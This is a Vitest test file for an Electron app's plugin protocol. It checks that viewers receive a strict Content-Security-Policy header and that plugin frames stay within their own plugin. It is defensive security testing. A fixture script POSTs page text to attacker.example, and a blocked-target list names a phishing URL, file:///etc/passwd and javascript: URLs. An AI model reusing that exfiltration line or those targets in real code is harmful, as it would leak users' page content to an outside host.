/**
 * TODO 919: the upper limit of the CSP for plugin viewers (the header), and the decision on moving the viewer's frame (`src/main/capability/viewer-csp.ts`).
 *
 * - the `aios-plugin://` delivery attaches the upper-limit CSP as a header even to the HTML of a test plugin that writes no CSP in meta
 * - the upper limit allows no outside source (http(s), ws, file, `*`), and every meta source of the bundled viewers is inside the limit
 * - a child frame can move only within its own plugin (not to outside pages, data:, or another plugin)
 *
 * Electron's `protocol` is a fake (it only picks up the function passed to handle). The model is not called.
 */
import { mkdirSync, mkdtempSync, readdirSync, readFileSync, realpathSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest'

const handlers = vi.hoisted(() => new Map<string, (request: Request) => Promise<Response>>())
vi.mock('electron', () => ({
  protocol: { handle: (scheme: string, fn: (request: Request) => Promise<Response>) => handlers.set(scheme, fn) }
}))

const { handlePluginScheme } = await import('../src/main/protocol.js')
const { VIEWER_CSP_CEILING, allowViewerFrameNavigation, parseCsp } = await import('../src/main/capability/viewer-csp.js')

const repoRoot = new URL('..', import.meta.url).pathname
let base: string

beforeAll(() => {
  base = realpathSync.native(mkdtempSync(join(tmpdir(), 'aios-viewer-csp-')))
  mkdirSync(join(base, 'viewer'), { recursive: true })
  // A viewer that writes no CSP in meta (when a third-party plugin does not write one)
  writeFileSync(
    join(base, 'viewer', 'index.html'),
    '<!doctype html><script type="module" src="./main.js"></script>'
  )
  writeFileSync(join(base, 'viewer', 'main.js'), "fetch('https://attacker.example/', { method: 'POST', body: document.body.innerText })")
})
afterAll(() => rmSync(base, { recursive: true, force: true }))

function serve(url: string): Promise<Response> {
  const plugins = { servingDirectoryOf: (id: string) => (id === 'test.nocsp' ? base : null) }
  handlePluginScheme(plugins as never)
  const handler = handlers.get('aios-plugin')
  if (handler === undefined) throw new Error('not registered')
  return handler(new Request(url))
}

/** The sources of a directive. If there are none, it falls back to `default-src` (CSP fallback). */
function sourcesOf(policy: Map<string, Set<string>>, directive: string): Set<string> {
  const fallback: Record<string, string[]> = {
    'worker-src': ['child-src', 'script-src', 'default-src'],
    'frame-src': ['child-src', 'default-src']
  }
  for (const name of [directive, ...(fallback[directive] ?? ['default-src'])]) {
    const found = policy.get(name)
    if (found !== undefined) return found
  }
  return new Set()
}

describe('aios-plugin:// の配信は上限の CSP を見出しで付ける (TODO 919)', () => {
  it('meta の CSP を書かない viewer の HTML にも付く。JS の応答にも付く (worker は自分の見出しで動く)', async () => {
    const html = await serve('aios-plugin://test.nocsp/viewer/index.html')
    expect(html.status).toBe(200)
    expect(html.headers.get('content-security-policy')).toBe(VIEWER_CSP_CEILING)
    await html.body?.cancel()
    const js = await serve('aios-plugin://test.nocsp/viewer/main.js')
    expect(js.headers.get('content-security-policy')).toBe(VIEWER_CSP_CEILING)
    await js.body?.cancel()
  })

  it('上限は外 (http(s)・ws・file・*・self) を 1 つも許さない', () => {
    const policy = parseCsp(VIEWER_CSP_CEILING)
    expect(policy.get('default-src')).toEqual(new Set(["'none'"]))
    for (const [directive, sources] of policy) {
      for (const source of sources) {
        expect(source, `${directive} ${source}`).not.toMatch(/^(https?:|wss?:|file:|\*|'self'|'unsafe-eval')/)
        expect(source, `${directive} ${source}`).not.toMatch(/\./) // No host name is written here at all
      }
    }
    for (const directive of ['connect-src', 'img-src', 'media-src', 'font-src', 'style-src', 'script-src', 'worker-src']) {
      expect(policy.has(directive), directive).toBe(true)
    }
    expect(policy.get('form-action')).toEqual(new Set(["'none'"]))
    expect(policy.get('frame-src')).toEqual(new Set(["'none'"]))
  })

  it('同梱の viewer の meta の CSP が許す取り込み元は、どれも上限の内側 (上限で同梱の viewer が壊れない)', () => {
    const ceiling = parseCsp(VIEWER_CSP_CEILING)
    const plugins = readdirSync(join(repoRoot, 'plugins')).filter((name) => name.startsWith('aios.'))
    let checked = 0
    for (const name of plugins) {
      let html: string
      try {
        html = readFileSync(join(repoRoot, 'plugins', name, 'viewer', 'index.html'), 'utf8')
      } catch {
        continue // plugins with no viewer (aios.gmail / aios.reddit)
      }
      const match = /http-equiv="Content-Security-Policy"\s+content="([^"]+)"/.exec(html)
      expect(match, `${name} has a meta CSP`).not.toBeNull()
      const meta = parseCsp(match?.[1] ?? '')
      for (const [directive, sources] of meta) {
        if (directive === 'default-src') continue
        const allowed = sourcesOf(ceiling, directive)
        for (const source of sources) {
          if (source === "'none'") continue
          expect(allowed.has(source), `${name}: ${directive} ${source}`).toBe(true)
        }
      }
      checked += 1
    }
    expect(checked).toBeGreaterThanOrEqual(9)
  })
})

describe('viewer の枠の移動 (allowViewerFrameNavigation、TODO 919)', () => {
  const A = 'aios-plugin://test.a/viewer/index.html'
  const B = 'aios-plugin://test.b/viewer/index.html'

  it('renderer 自身の切り替え (最上位の枠が始めた) はどの plugin へも通す', () => {
    expect(allowViewerFrameNavigation({ url: B, frameUrl: A, initiatorUrl: 'file:///app/index.html', initiatorIsTop: true })).toBe(true)
    expect(allowViewerFrameNavigation({ url: A, frameUrl: '', initiatorUrl: null, initiatorIsTop: false })).toBe(true)
  })

  it('plugin の枠は自分の plugin の中だけ移れる', () => {
    expect(
      allowViewerFrameNavigation({ url: 'aios-plugin://test.a/viewer/other.html', frameUrl: A, initiatorUrl: A, initiatorIsTop: false })
    ).toBe(true)
    expect(allowViewerFrameNavigation({ url: B, frameUrl: A, initiatorUrl: A, initiatorIsTop: false })).toBe(false)
    expect(allowViewerFrameNavigation({ url: B, frameUrl: A, initiatorUrl: null, initiatorIsTop: false })).toBe(false)
  })

  it('外のページ・data: ・blob: ・file: ・javascript: へは誰が始めても移らせない', () => {
    for (const url of [
      'https://attacker.example/phish',
      'http://127.0.0.1:8080/',
      'data:text/html,<script>1</script>',
      'blob:aios-plugin://test.a/1234',
      'file:///etc/passwd',
      'javascript:alert(1)',
      'aios-res://local/token/x.png'
    ]) {
      expect(allowViewerFrameNavigation({ url, frameUrl: A, initiatorUrl: A, initiatorIsTop: false }), url).toBe(false)
      expect(allowViewerFrameNavigation({ url, frameUrl: A, initiatorUrl: 'file:///app/index.html', initiatorIsTop: true }), url).toBe(false)
    }
  })

  it('aios.html の Preview の入れ子 (about:srcdoc / about:blank) は通す', () => {
    expect(allowViewerFrameNavigation({ url: 'about:srcdoc', frameUrl: '', initiatorUrl: A, initiatorIsTop: false })).toBe(true)
    expect(allowViewerFrameNavigation({ url: 'about:blank', frameUrl: '', initiatorUrl: A, initiatorIsTop: false })).toBe(true)
  })
})
